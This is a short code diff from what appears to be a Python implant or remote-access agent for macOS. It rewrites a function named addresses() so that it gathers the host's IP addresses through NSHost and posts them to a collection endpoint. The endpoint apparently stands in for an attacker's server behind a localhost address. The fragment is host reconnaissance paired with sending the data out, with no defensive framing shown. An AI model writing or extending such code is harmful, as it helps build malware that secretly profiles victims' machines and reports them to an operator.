@@ -190,10 +190,9 @@ def listusers():
 #############################
 def addresses():
     try:
-        s = NSAppleScript.alloc().initWithSource_("set ipaddress to IPv4 address of (get system info)")
-        p = s.executeAndReturnError_(None)
-        p2 = str(p).replace("<NSAppleEventDescriptor: ","").replace(">, None)", "")
-        a = {'content':p2}
+        s = NSHost.currentHost().addresses
+        p = str(s)
+        a = {'content':p}
         b = 'https://127.0.0.1/validatiion/profile/9'
         c = urllib2.Request(b,headers=headers,data=a.get('content'))
         d = urllib2.urlopen(c,context=context)
